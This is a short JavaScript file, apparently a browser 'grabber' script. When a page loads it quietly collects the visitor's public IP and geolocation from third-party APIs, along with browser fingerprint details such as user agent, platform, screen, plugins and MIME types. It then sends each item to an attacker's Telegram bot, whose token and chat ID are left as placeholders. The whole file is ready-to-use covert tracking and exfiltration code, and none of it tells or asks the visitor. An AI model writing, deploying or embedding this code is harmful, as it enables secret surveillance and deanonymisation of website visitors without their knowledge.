// Older Model 
// Ft .Smukx
const botToken = 'TELEGRAM_BOT_API_KEY';
const chatId = 'YOUR_CHAT_ID';


const getIP = async () => {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.log(error);
  }
};

const getLocation = async () => {
  try {
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();
    return `${data.city}, ${data.region}, ${data.country}`;
  } catch (error) {
    console.log(error);
  }
};

const getDeviceInfo = () => {
  const language = navigator.language;
  const userAgent = navigator.userAgent;
  const platform = navigator.platform;
  const screenWidth = screen.width;
  const screenHeight = screen.height;
  const colorDepth = screen.colorDepth;
  const cookiesEnabled = navigator.cookieEnabled;
  const doNotTrack = navigator.doNotTrack;
  const plugins = Array.from(navigator.plugins, plugin => `${plugin.name} ${plugin.version}`);
  const mimeTypes = Array.from(navigator.mimeTypes, mimeType => `${mimeType.type}`);
  return `Language: ${language}\nUser Agent: ${userAgent}\nPlatform: ${platform}\nScreen Width: ${screenWidth}\nScreen Height: ${screenHeight}\nColor Depth: ${colorDepth}\nCookies Enabled: ${cookiesEnabled}\nDo Not Track: ${doNotTrack}\nPlugins: ${plugins}\nMime Types: ${mimeTypes}`;
};

Promise.all([getIP(), getLocation()])
  .then(([publicIP, location]) => {
    const os = `${navigator.platform} ${navigator.oscpu}`;
    const browser = navigator.userAgent;
    const extraInfo = getDeviceInfo();
    const message = `OS: ${os}\nBrowser: ${browser}\nLocation: ${location}\nPublic IP: ${publicIP}\nExtra Info: ${extraInfo}`;
    const messageLines = message.split('\n');
    messageLines.forEach(line => {
      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${line}`;
      fetch(url);
    });
  })
  .catch(error => console.log(error));
